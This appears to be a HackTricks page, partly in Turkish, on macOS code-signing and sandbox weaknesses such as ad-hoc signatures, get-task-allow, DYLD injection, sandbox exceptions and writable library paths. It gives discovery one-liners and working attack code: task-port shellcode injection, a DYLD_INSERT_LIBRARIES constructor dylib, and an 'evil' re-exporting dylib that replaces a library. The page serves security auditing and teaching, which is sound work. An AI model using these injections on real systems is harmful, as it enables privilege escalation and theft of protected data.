# macOS Code Signing Weaknesses & Sandbox Escapes

{{#include ../../../banners/hacktricks-training.md}}

## Ad-Hoc Signed Binaries

### Temel Bilgi

**Ad-hoc signing** (`CS_ADHOC`) bir kod imzası oluşturur ve bu imzada **sertifika zinciri yoktur** — kodun bir hash'idir ve geliştirici kimliği doğrulaması içermez. İkili dosyanın kaynağı herhangi bir geliştiriciye veya kuruluşa izlenemez.

Apple Silicon Macs üzerinde, tüm yürütülebilir dosyalar en azından ad-hoc imzasına ihtiyaç duyar. Bu, birçok development aracı, Homebrew paketleri ve üçüncü taraf yardımcı programlarında ad-hoc imzalar bulacağınız anlamına gelir.

### Neden Önemli

- **Doğrulanabilir kimlik yok** — ikili, kimliğe dayalı kontroller tarafından tespit edilmeden değiştirilebilir
- Üçüncü taraf ad-hoc ikilileri **ayrıcalıklı pozisyonlarda** (FDA, daemon, helpers) yüksek öncelikli hedeflerdir
- Bazı yapılandırmalarda, ad-hoc signatures geliştirici imzalı koda göre **o kadar sıkı doğrulanmayabilir**
- **TCC grants** olan ad-hoc imzalı ikililer özellikle değerlidir — izinler, ikili içeriği değişse bile devam edebilir (bu, TCC'nin izni nasıl anahtarladığına bağlıdır)

### Keşif
```bash
# Find ad-hoc signed binaries
find /usr/local /opt /Applications -type f -perm +111 -exec sh -c '
flags=$(codesign -dvv "{}" 2>&1 | grep "CodeDirectory flags")
echo "$flags" | grep -q "adhoc" && echo "AD-HOC: {}"
' \; 2>/dev/null

# Check a specific binary
codesign -dv --verbose=4 /path/to/binary 2>&1 | grep -E "Signature|flags|Authority"
# Ad-hoc shows: "Signature=adhoc" and no Authority lines
```
### Saldırı: Binary Replacement
```bash
# If an ad-hoc signed daemon binary is in a writable location:
# 1. Check the binary's current capabilities
codesign -d --entitlements - /path/to/target 2>&1

# 2. Note its TCC grants in the database
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT service, auth_value FROM access WHERE client LIKE '%target%';"

# 3. Replace the binary (if location is writable)
cp /tmp/malicious-binary /path/to/target

# 4. Re-sign with ad-hoc signature (mimics the original)
codesign -s - /path/to/target

# 5. On next launch, the daemon runs your code with the original's TCC grants
# (This works when TCC keyed the grant by path rather than code signature)
```
---

## Debuggable Processes (get-task-allow)

### Basic Information

The **`com.apple.security.get-task-allow`** entitlement (or `CS_GET_TASK_ALLOW` flag) herhangi bir sürecin **debugger olarak bağlanmasına** izin verir; belleği okuma, registers değiştirme, kod inject etme ve yürütmeyi kontrol etme.

This is intended **only for development builds**. However, some third-party binaries ship with this entitlement in production.

> [!CAUTION]
> A production binary with `get-task-allow` is an **instant exploitation primitive**. Any local process can call `task_for_pid()`, get the target's Mach task port, and inject arbitrary code that runs with the target's entitlements, TCC grants, and security context.

### Keşif
```bash
# Find debuggable binaries
find /Applications /usr/local -type f -perm +111 -exec sh -c '
codesign -d --entitlements - "{}" 2>&1 | grep -q "get-task-allow.*true" && echo "DEBUGGABLE: {}"
' \; 2>/dev/null

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT path, privileged FROM executables e
JOIN executable_capabilities ec ON e.id = ec.executable_id
JOIN capabilities c ON ec.capability_id = c.id
WHERE c.name = 'get_task_allow_signature'
ORDER BY e.privileged DESC;"
```
### Saldırı: Task Port Injection
```c
#include <mach/mach.h>
#include <mach/mach_vm.h>

// Get the target's task port (requires get-task-allow on target)
mach_port_t task;
kern_return_t kr = task_for_pid(mach_task_self(), target_pid, &task);

if (kr == KERN_SUCCESS) {
// Allocate memory in target process
mach_vm_address_t addr = 0;
mach_vm_allocate(task, &addr, shellcode_size, VM_FLAGS_ANYWHERE);

// Write shellcode into target
mach_vm_write(task, addr, (vm_offset_t)shellcode, shellcode_size);

// Make it executable
mach_vm_protect(task, addr, shellcode_size, FALSE,
VM_PROT_READ | VM_PROT_EXECUTE);

// Create a remote thread to execute the shellcode
// The shellcode runs with ALL of the target's entitlements and TCC grants
}
```
---

## Kütüphane Doğrulaması Yok + DYLD Ortamı

### Ölümcül Kombinasyon

Bir binary **her ikisine de** sahipse:
- `com.apple.security.cs.disable-library-validation` (herhangi bir dylib yükler)
- `com.apple.security.cs.allow-dyld-environment-variables` (DYLD ortam değişkenlerini kabul eder)

Bu, **kesin bir code injection primitive**'dir — `DYLD_INSERT_LIBRARIES` kusursuz çalışır.

### Keşif
```bash
# Find binaries with the deadly combo
find /Applications -type f -perm +111 -exec sh -c '
ents=$(codesign -d --entitlements - "{}" 2>&1)
echo "$ents" | grep -q "disable-library-validation.*true" && \
echo "$ents" | grep -q "allow-dyld-environment.*true" && \
echo "INJECTABLE: {}"
' \; 2>/dev/null

# Using the scanner (both flags)
sqlite3 /tmp/executables.db "
SELECT path, privileged, tccPermsStr FROM executables
WHERE noLibVal = 1 AND allowDyldEnv = 1
ORDER BY privileged DESC;"
```
### Saldırı: DYLD_INSERT_LIBRARIES Injection
```bash
# 1. Create the injection dylib
cat > /tmp/inject.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor))
void injected(void) {
// This runs BEFORE main() in the target's process
// We inherit ALL of the target's:
// - Entitlements
// - TCC grants (camera, mic, FDA, etc.)
// - Sandbox exceptions
// - Mach port rights

FILE *f = fopen("/tmp/injected_proof.txt", "w");
fprintf(f, "Running as PID %d with target's privileges\n", getpid());
fclose(f);

// Example: if target has camera TCC, we can now capture video
// Example: if target has FDA, we can read any file
}
EOF

# 2. Compile the dylib
cc -shared -o /tmp/inject.dylib /tmp/inject.c

# 3. Inject into the target
DYLD_INSERT_LIBRARIES=/tmp/inject.dylib /path/to/noLibVal-dyldEnv-binary

# 4. Verify injection
cat /tmp/injected_proof.txt
```
---

## Sandbox Geçici İstisnaları

### Bunlar Sandbox'ı Nasıl Zayıflatır

Sandbox temporary exceptions (`com.apple.security.temporary-exception.*`) App Sandbox'ta delikler açar:

| Exception | Ne İzin Verir |
|---|---|
| `temporary-exception.mach-lookup.global-name` | Sistem genelindeki XPC/Mach servislerine bağlanma |
| `temporary-exception.files.absolute-path.read-write` | Uygulama konteynerinin dışındaki dosyaları okuma/yazma |
| `temporary-exception.iokit-user-client-class` | IOKit user-client bağlantıları açma |
| `temporary-exception.shared-preference.read-only` | Diğer uygulamaların tercihlerini okuma |
| `temporary-exception.files.home-relative-path.read-write` | `~` göreceli yollarına erişme |

### Mach-Lookup İstisnaları = Sandbox Escape Primitive

En tehlikeli istisna **mach-lookup** — sandboxed app'in ayrıcalıklı daemon'larla konuşmasına izin verir:
```bash
# Find apps with mach-lookup exceptions
find /Applications -name "*.app" -exec sh -c '
binary="$1/Contents/MacOS/$(defaults read "$1/Contents/Info.plist" CFBundleExecutable 2>/dev/null)"
[ -f "$binary" ] && {
ents=$(codesign -d --entitlements - "$binary" 2>&1)
echo "$ents" | grep -q "mach-lookup" && {
count=$(echo "$ents" | grep -c "mach-lookup")
echo "[$count exceptions] $(basename "$1")"
}
}
' _ {} \; 2>/dev/null | sort -rn
```
### Saldırı: Sandbox Escape via Mach-Lookup
```
1. Compromise sandboxed app (renderer exploit, malicious document, etc.)
2. Read entitlements to discover mach-lookup exceptions
3. For each reachable service:
a. Connect via NSXPCConnection
b. Discover the service's protocol (class-dump, strings)
c. Fuzz each exposed method
4. Find a vulnerability in a privileged daemon
5. Exploit → code execution in the daemon's context (outside sandbox)
```
---

## Özel Apple Yetkileri

### Ne oldukları

`com.apple.private.*` ile başlayan entitlements, üçüncü taraf geliştiricilere belgelenmemiş veya sunulmamış **Apple dahili API'leri** kullanma erişimi sağlar. Özel entitlements'e sahip üçüncü taraf ikili dosyalar bunları enterprise cert, MDM veya non-App-Store dağıtımı yoluyla edinmişlerdir.

### Tehlikeli Özel Yetkiler

| Entitlement | Yetenek |
|---|---|
| `com.apple.private.tcc.manager` | Tüm TCC veritabanını okuma/yazma |
| `com.apple.private.tcc.allow` | Belirli TCC servislerine erişim |
| `com.apple.private.security.no-sandbox` | sandbox olmadan çalıştırma |
| `com.apple.private.iokit` | Doğrudan IOKit sürücü erişimi |
| `com.apple.private.kernel.*` | Kernel arayüzüne erişim |
| `com.apple.private.xpc.launchd.job-label` | launchd işlerini kaydetme/yönetme |
| `com.apple.rootless.install` | SIP tarafından korunan yollara yazma |

### Keşif
```bash
# Find third-party binaries with private entitlements
find /Applications /usr/local -type f -perm +111 -exec sh -c '
ents=$(codesign -d --entitlements - "{}" 2>&1)
echo "$ents" | grep -q "com.apple.private" && {
echo "=== {} ==="
echo "$ents" | grep "com.apple.private" | head -10
}
' \; 2>/dev/null

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT path FROM executables
WHERE privateEnts = 1 AND isAppleBin = 0
ORDER BY privileged DESC;"
```
---

## Özel Sandbox Profilleri (SBPL)

### Ne Oldukları

İkili dosyalar SBPL (Seatbelt Profile Language) ile yazılmış **özel sandbox profilleri** ile gelebilir. Bu profiller, varsayılan App Sandbox'tan daha kısıtlayıcı VEYA **daha izin verici** olabilir.

### Özel Profilleri Denetleme
```bash
# Find custom sandbox profiles
find /Applications /System -name "*.sb" -o -name "*.sbpl" 2>/dev/null

# Dangerous SBPL rules to flag during audit:
# (allow file-write*)         — Write to ANY file
# (allow process-exec*)       — Execute ANY process
# (allow mach-lookup*)        — Connect to ANY Mach service
# (allow network*)            — Full network access
# (allow iokit*)              — Full IOKit access
# (allow file-read*)          — Read ANY file

# Example: Audit a sandbox profile for overly permissive rules
cat /path/to/custom.sb | grep "(allow" | sort -u
```
---

## Yazılabilir Kütüphane Yolları

### Ne Anlamına Gelirler

Bir binary, mevcut kullanıcının **yazabildiği** bir yoldan dynamic library yüklediğinde, kütüphane kötü amaçlı kodla değiştirilebilir.

### Keşif
```bash
# Using the scanner — find privileged binaries loading from writable paths
sqlite3 /tmp/executables.db "
SELECT e.path, e.privileged
FROM executables e
JOIN executable_capabilities ec ON e.id = ec.executable_id
JOIN capabilities c ON ec.capability_id = c.id
WHERE c.name = 'execs_writable_path'
ORDER BY e.privileged DESC
LIMIT 30;"

# Manual check: list library dependencies and check writability
otool -L /path/to/binary | awk '{print $1}' | while read lib; do
[ -f "$lib" ] && [ -w "$lib" ] && echo "WRITABLE: $lib"
done
```
### Saldırı: Dylib Replacement
```bash
# 1. Find the writable library
otool -L /path/to/target-daemon | grep "/usr/local\|/opt\|Library"

# 2. Back up the original
cp /path/to/writable.dylib /tmp/original.dylib

# 3. Create a replacement that re-exports the original
cat > /tmp/evil.c << 'EOF'
#include <stdio.h>
__attribute__((constructor))
void evil(void) {
system("id > /tmp/escalated.txt");
}
EOF
cc -shared -o /tmp/evil.dylib /tmp/evil.c \
-Wl,-reexport_library,/tmp/original.dylib

# 4. Replace the library
cp /tmp/evil.dylib /path/to/writable.dylib

# 5. When the daemon restarts, it loads the evil dylib with daemon privileges
```
## Referanslar

* [Apple Developer — Code Signing Guide](https://developer.apple.com/library/archive/technotes/tn2206/_index.html)
* [Apple Developer — App Sandbox](https://developer.apple.com/library/archive/documentation/Security/Conceptual/AppSandboxDesignGuide/AboutAppSandbox/AboutAppSandbox.html)
* [Apple Developer — Entitlements](https://developer.apple.com/documentation/bundleresources/entitlements)
* [The Evil Bit — clear-library-validation](https://theevilbit.github.io/posts/com.apple.private.security.clear-library.validation/)

{{#include ../../../banners/hacktricks-training.md}}
